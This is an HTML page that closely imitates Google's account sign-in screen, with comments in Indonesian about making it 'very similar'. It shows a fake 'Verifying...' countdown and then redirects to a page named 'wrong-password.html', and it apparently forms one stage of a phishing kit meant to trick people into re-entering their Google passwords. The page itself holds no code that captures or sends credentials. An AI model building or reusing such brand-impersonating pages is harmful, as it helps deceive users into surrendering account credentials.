<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sign in - Google Accounts</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      background-color: #f0f4f9;
      color: #202124;
      line-height: 1.4;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 24px;
    }

    /* Kotak Putih Utama Google */
    .container {
      width: 100%;
      max-width: 450px;
      padding: 48px 40px 36px 40px;
      border: 1px solid #dadce0;
      background: #ffffff;
      border-radius: 8px;
      display: flex;
      flex-direction: column;
      position: relative; /* Mengunci posisi progress bar */
      overflow: hidden; /* Memotong ujung progress bar agar mengikuti lengkungan border card */
    }

    header {
      margin-bottom: 0px;
      text-align: center;
    }

    /* Replikasi Google Wordmark Presisi */
    .g-logo {
      display: inline-block;
      font-family: 'Product Sans', 'Google Sans', Roboto, Arial, sans-serif;
      font-weight: 500;
      font-size: 24px;
      letter-spacing: -0.2px;
      line-height: 1;
      margin-bottom: 24px;
      width: 100%;
      text-align: center;
    }
    .g-logo span { display: inline-block; }

    .g-blue { color: #4285f4; }
    .g-red { color: #ea4335; }
    .g-yellow { color: #fbbc05; }
    .g-green { color: #34a853; }

    h1 { display: none; }

    /* Area Status Konten Tengah */
    .status-box {
      text-align: center;
      padding: 16px 0 24px 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* PERBAIKAN MUTLAK: Google Linear Progress Bar (Garis Berjalan Di Sisi Atas Kotak Putih) */
    .google-progress-bar {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background-color: #e8f0fe;
      overflow: hidden;
    }

    .google-progress-bar::before {
      content: "";
      position: absolute;
      background-color: #1a73e8;
      top: 0;
      left: 0;
      bottom: 0;
      width: 100%;
      height: 100%;
      animation: google-loading 2s linear infinite;
    }

    @keyframes google-loading {
      0% { transform: translateX(-100%) scaleX(0.4); }
      50% { transform: translateX(0%) scaleX(0.4); }
      100% { transform: translateX(100%) scaleX(0.4); }
    }

    /* Teks Keterangan Status */
    .loader-text {
      font-size: 16px;
      color: #202124;
      font-weight: 400;
      margin-bottom: 8px;
    }

    /* Teks Hitung Mundur Koneksi */
    .timer-text {
      font-size: 14px;
      color: #5f6368;
      font-weight: 400;
    }

    .divider { display: none; }

    /* Footer Di Luar Kotak Utama Supaya Sangat Mirip */
    .footer-outer { 
        width: 100%;
        max-width: 450px;
        display: flex; 
        justify-content: space-between; 
        align-items: center; 
        font-size: 12px; 
        color: #747775;
        margin-top: 24px;
        padding: 0 4px;
    }

    .footer-outer .right-links a { 
        color: #747775; 
        text-decoration: none; 
        margin-left: 16px; 
    }

    .footer-outer .right-links a:hover { color: #202124; }
  </style>
</head>
<body>
  <div class="container">
    <!-- Komponen Garis Animasi Loading Berada di Sini -->
    <div class="google-progress-bar"></div>

    <header>
      <h1>Sign in</h1>
      <div class="g-logo" aria-label="Google">
        <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
      </div>
    </header>

    <div class="status-box">
      <div class="loader-text">Verifying...</div>
      <div id="timer" class="timer-text">Checking connection... 10s</div>
    </div>
  </div>

  <!-- Struktur Footer Luar -->
  <div class="footer-outer">
    <div class="left-lang" style="cursor: pointer;">English (United States) ▾</div>
    <div class="right-links">
        <a href="#" onclick="return false;">Help</a>
        <a href="#" onclick="return false;">Privacy</a>
        <a href="#" onclick="return false;">Terms</a>
    </div>
  </div>

  <script>
    let seconds = 10;
    const timerEl = document.getElementById('timer');

    timerEl.textContent = 'Checking connection... ' + seconds + 's';

    const interval = setInterval(function() {
      seconds--;
      timerEl.textContent = 'Checking connection... ' + Math.max(seconds, 0) + 's';

      if (seconds <= 0) {
        clearInterval(interval);
        window.location.href = 'wrong-password.html';
      }
    }, 1000);
  </script>
</body>
</html>
